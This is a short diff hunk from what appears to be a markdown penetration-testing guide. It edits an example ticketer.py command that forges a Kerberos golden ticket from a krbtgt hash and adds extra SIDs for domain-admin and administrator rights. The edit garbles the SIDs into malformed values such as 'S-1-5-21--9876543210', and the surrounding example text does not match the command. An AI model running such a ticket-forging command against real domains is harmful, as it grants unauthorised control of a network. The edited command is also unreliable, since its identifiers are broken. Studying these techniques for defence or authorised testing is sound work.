@@ -66,5 +66,5 @@
    - *Example:* If the target domain is `target.local` and the group ID is 512 with additional SIDs `S-1-5-21-1234567890-1234567890-1234567890-500`, it would look like this:
 
    ```plaintext
-   ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-9876543210-9876543210-9876543210 -domain target.local -extra-sid S-1-5-21-9876543210-9876543210-9876543210-512,S-1-5-21-1234567890-1234567890-1234567890-500 goldenuser
+   ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21--9876543210 -domain target.local -extra-sid S-1-5-21-98763210-512,S-1-5-21-1234567890-1234567890-1234567890-500 goldenuser
    ```
